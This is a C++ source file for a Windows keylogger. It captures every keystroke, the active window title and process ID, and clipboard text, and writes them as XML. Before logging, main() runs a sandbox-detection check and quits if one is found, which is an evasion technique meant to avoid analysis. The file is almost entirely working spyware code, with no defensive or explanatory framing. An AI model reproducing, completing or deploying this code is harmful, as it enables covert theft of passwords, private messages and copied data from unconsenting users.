#include "KeyLogger.h"

char* last_cb_data;
WSAData _socket;
using namespace std;
/*HKEY hkey;*/
char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
const time_t hms = time(0);
clock_t Timer = clock(), Timer2;
bool gotchar=true;

FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
{
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
    char *TimeStamp=asctime(localtime(&hms));
    TimeStamp[strlen(TimeStamp)-1]=0x00;
    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
    <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
    return 0 ;
}

FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
{   int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
    if (strcmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY))
    {
        strcpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY);
        char *TimeStamp=asctime(localtime(&hms));
        TimeStamp[strlen(TimeStamp)-1]=0x00;
        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
        TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
    }
}

FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
{
   if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
       {
           gotchar=false;
           if (LastKeyStrokeLogged!=VkPrimary)
               {
                   Timer=clock();
                   Timer2=Timer;
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                   switch(temp)
                   {
                     case '<':  cout << "&lt;"; break;
                     case '>':  cout << "&gt;"; break;
                     case '&':  cout << "&amp;"; break;
                     case '\'':  cout << "&apos;"; break;
                     case '"':  cout << "&quot;"; break;
                     default:  cout << temp; break;
                   }
                   LastKeyStrokeLogged=VkPrimary;
               }
           if((Timer-clock())/500 && ((Timer2-clock())/31))
               {
                   Timer2=clock();
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                   switch(temp)
                   {
                     case '<':  cout << "&lt;"; break;
                     case '>':  cout << "&gt;"; break;
                     case '&':  cout << "&amp;"; break;
                     case '\'':  cout << "&apos;"; break;
                     case '"':  cout << "&quot;"; break;
                     default:  cout << temp; break;
                   }
                   LastKeyStrokeLogged=VkPrimary;
               }
           }
   return LastKeyStrokeLogged;
}

FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
{
    if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
        {
            gotchar=false;
            if (LastKeyStrokeLogged!=FunctionKey)
                {
                    Timer=clock();
                    Timer2=Timer;
                    cout<<StrOut;
                    LastKeyStrokeLogged=FunctionKey;
                }
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    Timer2=clock();
                    cout<<StrOut;
                    LastKeyStrokeLogged=FunctionKey;
                }
        }
    return LastKeyStrokeLogged;
}

FORCEINLINE int grabclipboard()
{
    if (OpenClipboard(NULL))
        {
            char* this_cb_data;
            HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
            if(cb_lock_handle)
                {
                this_cb_data=(char*)GlobalLock(cb_lock_handle);
                if(!strlen(this_cb_data))
                {

                    GlobalUnlock(cb_lock_handle);
                    CloseClipboard();
                    return 0;
                }
                if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
                {
                    if(last_cb_data == NULL)
                        last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
                    else
                        last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
                        strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));
                    cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
                    "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
                    "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
                }
                GlobalUnlock(cb_lock_handle);
                }
            CloseClipboard();


        }
    return 0;
}

int main()
{

    if(SandBoxDetection()) return SandBoxedInstance;

    cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
    HWND CURRENTPROCEESS=GetForegroundWindow();
    _USER_SHIFT_FOCUS(CURRENTPROCEESS);
    int LastKeyStrokeLogged;
    while (1)
    {
        gotchar=true;
        if (CURRENTPROCEESS==GetForegroundWindow())
        {
            GetAsyncKeyState(VK_SHIFT);// flush buffer;
            if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
                LastKeyStrokeLogged=1;
            for (int x=StartAsciiDec; x<EndAsciiDec; x++)
                LastKeyStrokeLogged=GrabKey(x,(char)x,_Char_Table[x-AsciiDecimalToBase],LastKeyStrokeLogged);

            for (int x=StartAsciiAlphebet; x<EndAsciiAlphebet;x++)
                LastKeyStrokeLogged=GetKeyState(VK_CAPITAL)?GrabKey(x,x,(x+AsciiLowerToUpper),LastKeyStrokeLogged):GrabKey(x,x+AsciiLowerToUpper,x,LastKeyStrokeLogged);

            for (int x=StartFunctionKeys; x<EndFunctionKeys; x++)
                LastKeyStrokeLogged=GrabFuncKey(MapFunctionVkeys[x].Key,MapFunctionVkeys[x].str,LastKeyStrokeLogged);

            for (int x=StartUnmapedKeys; x<EndUnmapedKeys; x++)
                LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
        }
        else
        {
            cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
            CURRENTPROCEESS=GetForegroundWindow();
            _USER_SHIFT_FOCUS(CURRENTPROCEESS);
        }
        grabclipboard();
        EnterEvent(CURRENTPROCEESS);
    }
    return 0;
}
